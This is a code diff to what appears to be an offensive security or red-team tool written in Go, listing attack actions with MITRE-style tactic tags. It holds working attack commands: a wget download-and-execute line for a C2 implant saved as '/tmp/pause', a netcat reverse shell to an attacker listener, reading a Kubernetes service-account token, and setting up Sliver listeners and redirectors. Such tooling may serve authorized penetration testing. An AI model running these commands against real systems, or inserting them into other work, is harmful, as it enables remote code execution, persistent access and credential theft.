@@ -81,12 +81,14 @@ func LoadArmory(dir string) (Armory, error) {
 		{
 			Name:        "Create Listener",
 			Description: "Catch incoming shells",
+			Tactics:     []domain.Tactic{domain.ResourceDevelopment},
 			Command:     domain.StartListener{Port: 1337, Protocol: domain.TCP},
 			// Port:        1337,
 		},
 		{
 			Name:        "Create Sliver HTTP Listener",
 			Description: "Catch incoming shells",
+			Tactics:     []domain.Tactic{domain.ResourceDevelopment},
 			Command:     domain.StartListener{Port: 1337, Protocol: domain.HTTP, Server: "sliver"},
 			Requires:    domain.Requirements{
 				// Kind: "C2:Sliver",
@@ -96,12 +98,14 @@ func LoadArmory(dir string) (Armory, error) {
 		{
 			Name:        "Create Redirector",
 			Description: "Create a proxy routing traffic to the C2",
+			Tactics:     []domain.Tactic{domain.ResourceDevelopment},
 			Command:     domain.StartC2Redirector{DstPort: 1337},
 			Requires:    domain.Requirements{Exists: "listener"},
 		},
 		{
 			Name:        "Drop & Exec Implant",
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
+			Tactics:     []domain.Tactic{domain.Execution},
 			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
 			Cmd:      "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
 			Requires: domain.Requirements{AccessLevel: domain.UserExec},
@@ -109,6 +113,7 @@ func LoadArmory(dir string) (Armory, error) {
 		{
 			Name:        "Read SerivceAccount Token",
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
+			Tactics:     []domain.Tactic{domain.CredentialAccess},
 			Cmd:         "cat",
 			CmdVariants: map[string]string{
 				"sliver": "get_file",
@@ -121,7 +126,7 @@ func LoadArmory(dir string) (Armory, error) {
 
 		{
 			Name:     "Check Token permissions",
-			Tactics:  []string{"Discovery"},
+			Tactics:  []domain.Tactic{domain.Discovery},
 			Requires: domain.Requirements{Kind: "ServiceAccount"},
 			CmdVariants: map[string]string{
 				"kubectl": "kubectl auth can-i --list --token=$TOKEN --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n $NAMESPACE",
@@ -131,14 +136,14 @@ func LoadArmory(dir string) (Armory, error) {
 		{
 			Name:        "Start Netcat shell",
 			Description: "Establish a simple shell using netcat",
+			Tactics:     []domain.Tactic{domain.Execution},
 			Cmd:         "nc $LISTENER $LISTENER_PORT -e /bin/sh &",
-			Tactics:     []string{"Execution"},
 			Requires:    domain.Requirements{Infra: []string{"Listener"}, AccessLevel: domain.UserExec},
 		},
 		{
 			Name:          "Read Environment Variables",
 			Description:   "Read environment variables from a target",
-			Tactics:       []string{"Discovery"},
+			Tactics:       []domain.Tactic{domain.Discovery},
 			Requires:      domain.Requirements{AccessLevel: domain.UserRead},
 			Cmd:           "env",
 			ResultHandler: handleEnvVarResult,
